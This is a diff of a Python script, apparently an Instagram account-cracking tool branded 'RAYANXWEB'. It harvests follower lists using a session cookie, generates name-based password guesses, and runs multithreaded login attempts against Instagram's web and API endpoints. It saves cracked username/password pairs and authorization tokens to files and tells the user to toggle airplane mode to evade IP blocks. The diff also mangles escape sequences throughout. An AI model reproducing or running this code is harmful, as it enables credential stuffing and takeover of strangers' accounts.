@@ -5,22 +5,31 @@ import os
 import sys
 import json
 import random
+import urllib
 import urllib.request
+import hmac
 import hashlib
 import time
+import string
 import uuid
 import requests
 import base64
 import datetime
+import subprocess
 from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as bsp
+from rich.progress import Progress, TextColumn, SpinnerColumn
 from rich.panel import Panel as panel
 from rich import print as prints
+from rich.tree import Tree
+from string import *
 
-# Global variables
+xx = 0
+rr = random.randint
+rc = random.choice
+
 Uid, Uuid = [], []
 Ok, Cp, Loop = 0, 0, 0
-
-# Color codes
 WHITE = '\x1b[1;97m'
 RED = '\x1b[1;91m'
 GREEN = '\x1b[1;92m'
@@ -121,11 +130,11 @@ def Menu():
 {CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
 {CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
 {CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
-    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
+    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\\n{WHITE}Followers : {GREEN}{fol}")
     
-    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
+    print(f"\\n{RED}[ {YELLOW}Crack Menu {RED}]\\n\\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
     print(f"{BLUE}═" * 80)
-    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")
+    x = input(f"\\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")
 
     if x in ['01', '1']:
         dumps(aset, True)
@@ -139,19 +148,16 @@ def Menu():
         exit()
 
 def crackfile():
+    nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
     try:
-        nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
         with open(nu, 'r') as file:
             for line in file:
                 Uuid.append(line.strip())
-        print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
-        MetodeType()
-    except FileNotFoundError:
+    except:
         print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
         exit()
-    except Exception as e:
-        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}Error: {e}")
-        exit()
+    print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
+    MetodeType()
 
 def dumps(cintil, typess):
     xyz = []
@@ -162,9 +168,9 @@ def dumps(cintil, typess):
             cintil['cookie'] += ';csrftoken=%s;' % token
         except Exception as e:
             os.system('rm -rf data/cookie.txt')
-            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
+            exit(f'\\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
     lemes = open('data/cookie.txt', 'r').read()
-    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
+    prints(panel(f"\\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
     users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
     try:
         for y in users:
@@ -203,7 +209,7 @@ def Graphql(typess, userid, cokie, after):
         req = requests.get(api, params=mek, headers=ptk).json()
         if 'require_login' in req:
             if len(Uuid) == 0:
-                exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
+                exit(f'\\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
         khm = 'edge_followed_by' if typess else 'edge_follow'
         for xyz in req['data']['user'][khm]['edges']:
             username = xyz['node']['username']
@@ -211,7 +217,7 @@ def Graphql(typess, userid, cokie, after):
             if xy not in Uuid:
                 xx += 1
                 Uuid.append(xy)
-                print('\rCollecting Uid {}{}{}                            '.format(RED, len(Uuid), WHITE), end='')
+                print('\\rCollecting Uid {}{}{}                            '.format(RED, len(Uuid), WHITE), end='')
                 time.sleep(0.0009)
         end = req['data']['user'][khm]['page_info']['has_next_page']
         if end:
@@ -222,11 +228,11 @@ def Graphql(typess, userid, cokie, after):
 
 def MetodeType():
     global SistemLog
-    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
+    prints(panel(f"""\\n{RED}[ {BLUE}Select the method to use{RED} ]\\n\\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
 {RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
 {RED}[{CYAN}03{RED}] {WHITE}i.instagram.com method
 {RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
-    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
+    method = input(f"\\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
     if method in ['01', '1']:
         SistemLog = "api.instagram.com"
     elif method in ['02', '2']:
@@ -240,7 +246,7 @@ def MetodeType():
     SetCrack()
 
 def SetCrack():
-    print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
+    print(f"\\n{YELLOW}Cracking in progress, please enable airplane mode \\nfor every 100 usernames/id for 5 seconds\\n{WHITE}")
     with ThreadPoolExecutor(max_workers=30) as ASF:
         for i in Uuid:
             try:
@@ -256,10 +262,10 @@ def SetCrack():
                     ASF.submit(Crack_N, username, kontol)
             except:
                 pass
-    exit(f' \n\n {GREEN}Cracking completed')
+    exit(f' \\n\\n {GREEN}Cracking completed')
 
 def Password(name):
-    xxzx = []
+    xxzx, ccvc = [], []
     for nama in name.split(' '):
         nama = nama.lower()
         if len(nama) < 3:
@@ -296,7 +302,9 @@ def Password(name):
             xxzx.append(nama + '123456')
             xxzx.append(nama.capitalize() + '321')
             xxzx.append(nama + '34')
+            xxzx.append(nama + '12345')
             xxzx.append(nama + '2009')
+            xxzx.append(nama + '12345')
             xxzx.append(nama + '28')
             xxzx.append(nama + '29')
             xxzx.append('wonosobo12345')
@@ -332,8 +340,8 @@ def data_target(name):
             post = profil_info_target["edge_owner_to_timeline_media"]["count"]
             peng = profil_info_target["edge_followed_by"]["count"]
             meng = profil_info_target["edge_follow"]["count"]
-            mail = profil_info_target.get("business_email")
-            phone = profil_info_target.get("business_phone_number")
+            mail = profil_info_target["business_email"]
+            phone = profil_info_target["business_phone_number"]
             fullname = profil_info_target["full_name"]
             fbid = profil_info_target["fbid"]
         except Exception as e:
@@ -358,7 +366,7 @@ def UserAgentBarcelona():
 
 def Crack_api(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
@@ -396,20 +404,20 @@ def Crack_api(username, memek):
             if 'userId' in str(response.text):
                 kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
+                print(f"                                                               ", end='\\r')
                 time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\n{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
+                print(f"\\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\\nUsername: {GREEN}{username}{BLUE}\\nPassword: {GREEN}{password}{BLUE}\\nFollowers: {GREEN}{peng}{BLUE}\\nFollowing: {GREEN}{meng}\\n{BLUE}Posts: {GREEN}{post}{BLUE}\\nfb_id: {GREEN}{fbid}{BLUE}\\n{BLUE}Authorization: {WHITE}{kuki}{WHITE}\\n")
                 Ok += 1
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\\n{peng}|{meng}\\n{kuki}\\n")
                 break
             elif 'checkpoint' in str(response.text):
                 Cp += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r {WHITE}Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n {WHITE}Followers: {BLUE}{peng}{WHITE}\n Following: {BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\\r {WHITE}Username: {BLUE}{username}{WHITE}\\n Password:{BLUE} {password}\\n {WHITE}Followers: {BLUE}{peng}{WHITE}\\n Following: {BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\\n' % (username, password))
                 break
             elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
-                sys.stdout.write(f"\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+                sys.stdout.write(f"\\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                 sys.stdout.flush()
             else:
                 continue
@@ -419,7 +427,7 @@ def Crack_api(username, memek):
 
 def Crack_i(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
@@ -474,19 +482,19 @@ def Crack_i(username, memek):
                     ig_set_authorization = None
                 Ok += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
+                print(f"                                                               ", end='\\r')
                 time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
+                print(f"\\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\\nUsername: {GREEN}{username}{BLUE}\\nPassword: {GREEN}{password}{BLUE}\\nFollowers: {GREEN}{peng}{BLUE}\\nFollowing: {GREEN}{meng}\\n{BLUE}Posts: {GREEN}{post}{BLUE}\\nfb_id: {GREEN}{fbid}{WHITE}\\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\\n{peng}|{meng}\\n{ig_set_authorization}\\n")
                 break
             elif 'challenge_required' in response2.text:
                 Cp += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\\r Username: {BLUE}{username}{WHITE}\\n Password:{BLUE} {password}\\n Followers: {BLUE}{peng}{WHITE}\\n Following:{BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\\n' % (username, password))
                 break
             elif 'ip_block' in response2.text or 'generic_request_error' in response2.text:
-                sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+                sys.stdout.write(f"\\rStatus IP: {RED}spam{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                 sys.stdout.flush()
             else:
                 continue
@@ -496,7 +504,7 @@ def Crack_i(username, memek):
 
 def Crack_w(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
@@ -541,7 +549,7 @@ def Crack_w(username, memek):
             })
             data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_instagram%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
             response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
-            resp_text = response.text.replace('\\', '')
+            resp_text = response.text.replace('\\\\', '')
             if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
                 try:
                     ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', resp_text).group(1)
@@ -551,19 +559,19 @@ def Crack_w(username, memek):
                     cookies = '-'
                 Ok += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
+                print(f"                                                               ", end='\\r')
                 time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\nCookie: {WHITE}{cookies}{WHITE}\n")
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
+                print(f"\\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\\nUsername: {GREEN}{username}{BLUE}\\nPassword: {GREEN}{password}{BLUE}\\nFollowers: {GREEN}{peng}{BLUE}\\nFollowing: {GREEN}{meng}\\n{BLUE}Posts: {GREEN}{post}{BLUE}\\nfb_id: {GREEN}{fbid}{BLUE}\\nCookie: {WHITE}{cookies}{WHITE}\\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\\n{peng}|{meng}\\n{cookies}\\n")
                 break
             elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
                 Cp += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\\r Username: {BLUE}{username}{WHITE}\\n Password:{BLUE} {password}\\n Followers: {BLUE}{peng}{WHITE}\\n Following:{BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\\n' % (username, password))
                 break
             elif 'ip_block' in resp_text or 'Please wait' in resp_text:
-                sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+                sys.stdout.write(f"\\rStatus IP: {RED}spam{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                 sys.stdout.flush()
             else:
                 continue
@@ -573,7 +581,7 @@ def Crack_w(username, memek):
 
 def Crack_N(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
@@ -619,15 +627,15 @@ def Crack_N(username, memek):
                 ig_set_authorization = response.headers.get('ig-set-authorization')
                 Ok += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
+                print(f"                                                               ", end='\\r')
                 time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
+                print(f"\\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\\nUsername: {GREEN}{username}{BLUE}\\nPassword: {GREEN}{password}{BLUE}\\nFollowers: {GREEN}{peng}{BLUE}\\nFollowing: {GREEN}{meng}\\n{BLUE}Posts: {GREEN}{post}{BLUE}\\nfb_id: {GREEN}{fbid}{WHITE}\\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\\n{peng}|{meng}\\n{ig_set_authorization}\\n")
                 break
             elif 'challenge_required' in response.text or '/challenge/' in response.text:
                 Cp += 1
-                print(f"\r Username:{BLUE} {username}{WHITE}\n Password: {BLUE}{password}\n")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\\r Username:{BLUE} {username}{WHITE}\\n Password: {BLUE}{password}\\n")
+                open('data/CP.txt', 'a').write('%s|%s\\n' % (username, password))
                 break
             else:
                 continue
